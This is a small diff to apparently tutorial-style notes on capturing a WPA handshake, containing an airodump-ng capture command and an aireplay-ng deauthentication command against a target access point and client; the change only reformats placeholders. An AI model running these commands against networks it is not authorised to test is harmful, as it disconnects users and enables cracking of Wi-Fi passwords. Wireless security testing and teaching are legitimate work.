@@ -11,5 +11,5 @@
 	airodump-ng --bssid<target AP mac> --channel<target AP channel> --write wpa_handshake wlan0
 
 Disconnect a client from the network in order to capture the handshake when the client tries to reconnect
-aireplay-ng --deauth 4 -a <target Ap mac> -c <target client mac> wlan0
+aireplay-ng --deauth 4 -a **target Ap mac** -c **target client mac** wlan0
 
